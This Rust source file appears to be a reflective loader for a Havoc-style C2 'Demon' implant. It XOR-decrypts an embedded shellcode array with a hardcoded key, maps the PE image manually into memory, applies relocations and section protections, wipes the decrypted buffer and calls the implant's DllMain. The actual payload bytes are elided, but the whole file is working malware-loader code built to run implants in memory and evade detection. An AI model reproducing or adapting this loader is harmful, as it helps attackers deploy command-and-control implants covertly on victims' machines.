#![allow(non_snake_case, non_camel_case_types)]

use std::{
    intrinsics::write_bytes, ptr::{copy_nonoverlapping, null_mut}, str::from_utf8
};

use winapi::{
    ctypes::c_void,
    um::{
        errhandlingapi::GetLastError,
        memoryapi::{VirtualAllocEx, VirtualProtectEx},
        processthreadsapi::GetCurrentProcess,
        winnt::{
            DLL_PROCESS_ATTACH, IMAGE_BASE_RELOCATION, IMAGE_DIRECTORY_ENTRY_BASERELOC,
            IMAGE_DOS_HEADER, IMAGE_DOS_SIGNATURE, IMAGE_NT_HEADERS, IMAGE_NT_SIGNATURE,
            IMAGE_REL_BASED_DIR64,
            IMAGE_SCN_MEM_EXECUTE, IMAGE_SCN_MEM_READ, IMAGE_SCN_MEM_WRITE, IMAGE_SECTION_HEADER,
            MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE, PAGE_EXECUTE_READ, PAGE_EXECUTE_READWRITE,
            PAGE_READONLY, PAGE_READWRITE, PAGE_WRITECOPY,
        }
    },
};

const SHELLCODE: &[u8] = &[0x1, 0x2, .....];

const KEY: &[u8] = &[
    0x70, 0x6c, 0x6d, 0x6f, 0x6b, 0x6e, 0x69, 0x6a, 0x62, 0x75, 0x68, 0x76, 0x79, 0x67, 0x63, 0x74,
    0x66, 0x78, 0x72, 0x64, 0x7a, 0x65, 0x73, 0x77, 0x61, 0x71,
];

// #pragma pack(1)
// typedef struct
// {
//     PVOID KaynLdr;
//     PVOID DllCopy;
//     PVOID Demon;
//     DWORD DemonSize;
//     PVOID TxtBase;
//     DWORD TxtSize;
// } KAYN_ARGS, *PKAYN_ARGS;

#[repr(C)]
#[derive(Debug, Default, Clone, Copy)]
struct KaynArgs {
    KaynLdr: *mut c_void,
    DllCopy: *mut c_void,
    Demon: *mut c_void,
    DemonSize: u32,
    TxtBase: *mut c_void,
    TxtSize: u32,
}

#[repr(transparent)]
struct IMAGE_RELOC(u16);

impl IMAGE_RELOC {
    fn offset(&self) -> u16 {
        self.0 & 0xFFF
    }
    fn typ(&self) -> u16 {
        (self.0 >> 12) & 0xF
    }
}

type DllMain = unsafe extern "system" fn(
    hinst_dll: *mut c_void,
    fdw_reason: u32,
    lpv_reserved: *mut c_void,
) -> i32;

fn decrypt_xor(data: &mut [u8], key: &[u8]) {
    for (i, byte) in data.iter_mut().enumerate() {
        *byte ^= key[i % key.len()];
    }
}

fn pause() {
    println!("[*] Press Enter to continue...");
    let mut input = String::new();
    std::io::stdin().read_line(&mut input).unwrap();
}

fn relocate_image(
    image_base_real: *mut c_void,
    preferred_base: *mut c_void,
    base_reloc_dir: *mut c_void,
) {
    unsafe {
        let mut current_br = base_reloc_dir as *const IMAGE_BASE_RELOCATION;
        let delta = (image_base_real as usize).wrapping_sub(preferred_base as usize) as isize;

        println!(
            "[+] Relocation: preferred_base={:p}, image_base_real={:p}, delta={:#x}",
            preferred_base, image_base_real, delta
        );

        let mut total_relocs = 0usize;
        let mut total_blocks = 0usize;

        while (*current_br).VirtualAddress != 0 {
            let block_size = (*current_br).SizeOfBlock as usize;
            if block_size >= size_of::<IMAGE_BASE_RELOCATION>() {
                let entry_count = (block_size - size_of::<IMAGE_BASE_RELOCATION>()) / 2;
                let reloc_start = (current_br as *const u8)
                    .add(size_of::<IMAGE_BASE_RELOCATION>())
                    as *const u16;

                let mut block_relocs = 0usize;
                for i in 0..entry_count {
                    let reloc = IMAGE_RELOC(*reloc_start.add(i));
                    if reloc.typ() == IMAGE_REL_BASED_DIR64 {
                        let offset = reloc.offset() as usize;
                        let patch_addr = (image_base_real as *mut u8)
                            .add((*current_br).VirtualAddress as usize)
                            .add(offset)
                            as *mut usize;
                        let old_val = patch_addr.read();
                        *patch_addr = old_val.wrapping_add(delta as usize);
                        block_relocs += 1;
                    }
                }
                total_relocs += block_relocs;
                total_blocks += 1;
                println!(
                    "    Reloc block: VA={:#x}, entries={}, patched={}",
                    (*current_br).VirtualAddress, entry_count, block_relocs
                );
            }
            current_br = (current_br as *const u8).add(block_size) as *const IMAGE_BASE_RELOCATION;
        }

        println!(
            "[+] Relocation complete: {} blocks, {} patches applied",
            total_blocks, total_relocs
        );
    }
}

fn main() {
    unsafe {
        let mut shellcode = SHELLCODE.to_vec();

        let _payload_size = shellcode.len();

        decrypt_xor(&mut shellcode, KEY);

        // let exec_mem = VirtualAlloc(
        //     null_mut(),
        //     payload_size,
        //     MEM_COMMIT | MEM_RESERVE,
        //     PAGE_READWRITE,
        // );

        // if exec_mem.is_null() {
        //     println!("[-] VirtualAlloc failed with error: {}", GetLastError());
        //     return;
        // }

        // println!("[+] Allocated memory of size {} bytes: {:p}", payload_size, exec_mem);

        // let mut bytes_written = 0;

        // let status = WriteProcessMemory(
        //     GetCurrentProcess(),
        //     exec_mem,
        //     shellcode.as_ptr() as *mut c_void,
        //     payload_size,
        //     &mut bytes_written,
        // );

        // if status == 0 {
        //     println!(
        //         "[-] WriteProcessMemory failed with error: {}",
        //         GetLastError()
        //     );
        //     return;
        // }

        // println!("[+] Written {} bytes to memory", bytes_written);

        // pause();

        let mut kayn_args = KaynArgs::default();

        let dos_header = shellcode.as_ptr() as *const IMAGE_DOS_HEADER;

        if (*dos_header).e_magic != IMAGE_DOS_SIGNATURE {
            println!("[-] Invalid DOS header magic");
            return;
        }

        let nt_header =
            shellcode.as_ptr().add((*dos_header).e_lfanew as usize) as *const IMAGE_NT_HEADERS;

        if (*nt_header).Signature != IMAGE_NT_SIGNATURE {
            println!("[-] Invalid NT header signature");
            return;
        }

        let first_section = (nt_header as *const u8).add(size_of::<IMAGE_NT_HEADERS>())
            as *const IMAGE_SECTION_HEADER;

        let hdr_size = (*first_section).VirtualAddress as usize;
        let image_size = (*nt_header).OptionalHeader.SizeOfImage as usize;

        println!("[+] Headers size: {} bytes", hdr_size);
        println!("[+] Image size: {} bytes", image_size);

        // Allocate full SizeOfImage (headers + all sections)
        let image_base = VirtualAllocEx(
            GetCurrentProcess(),
            null_mut(),
            image_size,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        );

        if image_base.is_null() {
            println!("[-] VirtualAllocEx failed with error: {}", GetLastError());
            return;
        }

        println!(
            "[+] Memory allocated: {} bytes at {:p}",
            image_size, image_base
        );

        // Copy PE headers to the beginning of the allocation
        copy_nonoverlapping(
            shellcode.as_ptr(),
            image_base as *mut u8,
            hdr_size,
        );
        println!("[*] Copied PE headers ({} bytes) to {:p}", hdr_size, image_base);

        // Copy sections at their proper VirtualAddress offsets
        for i in 0..(*nt_header).FileHeader.NumberOfSections {
            let section: *const IMAGE_SECTION_HEADER = first_section.add(i as usize);

            let name = from_utf8(&(*section).Name)
                .unwrap()
                .trim_matches(char::from(0));

            let src = shellcode.as_ptr().add((*section).PointerToRawData as usize) as *const u8;
            let dest = (image_base as *mut u8).add((*section).VirtualAddress as usize);
            let size = (*section).SizeOfRawData as usize;

            println!("[*] Copying section '{}' (VA={:#x}, size={:#x})...", name, (*section).VirtualAddress, size);

            copy_nonoverlapping(src, dest, size);
        }

        // Apply base relocations
        let reloc_directory =
            (*nt_header).OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC as usize];

        if reloc_directory.VirtualAddress != 0 && reloc_directory.Size > 0 {
            let reloc_addr = (image_base as *mut u8).add(reloc_directory.VirtualAddress as usize);

            relocate_image(
                image_base,
                (*nt_header).OptionalHeader.ImageBase as *mut c_void,
                reloc_addr as *mut c_void,
            );
        }

        // Protect PE headers as read-only
        let mut hdr_old_protect = 0;
        if VirtualProtectEx(
            GetCurrentProcess(),
            image_base,
            hdr_size,
            PAGE_READONLY,
            &mut hdr_old_protect,
        ) == 0 {
            println!("[-] VirtualProtectEx failed for headers: {}", GetLastError());
            return;
        }
        println!("[*] Headers protected as PAGE_READONLY ({:#x} bytes)", hdr_size);

        // Set section memory protections
        for i in 0..(*nt_header).FileHeader.NumberOfSections {
            let name = from_utf8(&(*first_section.add(i as usize)).Name)
                .unwrap()
                .trim_matches(char::from(0));
            let section: *const IMAGE_SECTION_HEADER = first_section.add(i as usize);
            let sec_mem = (image_base as *mut u8)
                .add((*section).VirtualAddress as usize)
                as *mut c_void;

            let sec_mem_size = if *(*section).Misc.VirtualSize() != 0 {
                *(*section).Misc.VirtualSize() as usize
            } else {
                (*section).SizeOfRawData as usize
            };

            let protection;
            let mut old_protection = 0;

            let characteristics = (*section).Characteristics;
            let read = (characteristics & IMAGE_SCN_MEM_READ) != 0;
            let write = (characteristics & IMAGE_SCN_MEM_WRITE) != 0;
            let execute = (characteristics & IMAGE_SCN_MEM_EXECUTE) != 0;

            if execute && read && write {
                protection = PAGE_EXECUTE_READWRITE;
            } else if execute && read {
                protection = PAGE_EXECUTE_READ;
            } else if read && write {
                protection = PAGE_READWRITE;
            } else if read {
                protection = PAGE_READONLY;
            } else if execute {
                protection = PAGE_EXECUTE;
            } else if write {
                protection = PAGE_WRITECOPY;
            } else {
                protection = 0;
            }

            if execute && read {
                kayn_args.TxtBase = sec_mem;
                kayn_args.TxtSize = sec_mem_size as u32;
                println!(
                    "[+] Section '{}' - TxtBase: {:p}, TxtSize: {:#x}",
                    name, sec_mem, sec_mem_size
                );
            }

            println!(
                "[*] Section '{}' - Protection: {:#x}, Size: {:#x}",
                name, protection, sec_mem_size
            );

            let status = VirtualProtectEx(
                GetCurrentProcess(),
                sec_mem,
                sec_mem_size,
                protection,
                &mut old_protection,
            );

            if status == 0 {
                println!(
                    "[-] VirtualProtectEx failed for section {} with error: {}",
                    name,
                    GetLastError()
                );
                return;
            }
        }

        let entry_point_rva = (*nt_header).OptionalHeader.AddressOfEntryPoint as usize;
        let entry_point = (image_base as usize + entry_point_rva) as *mut c_void;

        // Dump first 16 bytes at entry point to verify it's real code
        let ep_bytes = std::slice::from_raw_parts(entry_point as *const u8, 16);
        println!(
            "[+] DllMain entry point: {:p} (RVA={:#x})",
            entry_point, entry_point_rva
        );
        print!("[+] Entry point bytes: ");
        for b in ep_bytes {
            print!("{:#04x} ", b);
        }
        println!();

        let dll_main: DllMain = std::mem::transmute(entry_point);

        // kayn_args.KaynLdr = (shellcode.as_ptr() as usize & !0xFFF) as *mut c_void;
        // kayn_args.DllCopy = shellcode.as_ptr() as *mut c_void;
        kayn_args.Demon = image_base;
        kayn_args.DemonSize = image_size as u32;

        let shellcode_len = shellcode.len();
        write_bytes(shellcode.as_mut_ptr(), 0, shellcode_len);
        drop(shellcode);
        println!("[+] Wiped and freed decrypted shellcode ({} bytes)", shellcode_len);

        kayn_args.KaynLdr = null_mut();
        kayn_args.DllCopy = null_mut();

        println!("[+] Calling DllMain with arguments: {:#?}", kayn_args);
        pause();

        // let result = dll_main(image_base, DLL_PROCESS_ATTACH, &mut kayn_args as *mut _ as *mut c_void);
        let result = dll_main(image_base, DLL_PROCESS_ATTACH, null_mut());

        if result == 0 {
            println!("[-] DllMain returned FALSE");
        } else {
            println!("[+] DllMain executed successfully");
        }

        pause();
    }
}
